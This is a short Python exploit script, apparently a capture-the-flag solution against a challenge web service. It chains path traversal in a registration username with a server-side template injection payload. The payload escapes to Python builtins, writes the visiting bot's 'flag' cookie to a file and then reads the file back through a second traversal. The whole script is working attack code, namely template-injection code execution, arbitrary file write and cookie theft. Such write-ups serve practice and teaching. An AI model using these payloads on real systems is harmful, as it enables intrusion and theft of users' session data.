import requests
import time

url = "https://binder-service.chall.ybn.sg/"
s = requests.Session()

DIR = 'hacked'
LEAK = 'data/exfil.txt'

s.get(f'{url}/admin', params={ 'userId': DIR })

payload = "self.__init__.__globals__.__builtins__['open']('%s','w').write(self.__init__.__globals__.__builtins__['__import__']('flask').request.cookies.get('flag',''))" % LEAK

s.post(f"{url}/register", data={
    'username': f'../../data/{DIR}.json',
    'description': '{{ %s }}' % payload,
})

s.post(f'{url}/visit')

time.sleep(3)

s.post(
    f"{url}/register",
    data={
        "username": f"../../{LEAK}",
        "description": "x",
    },
)

res = s.get(f"{url}/profile")
print(res.text)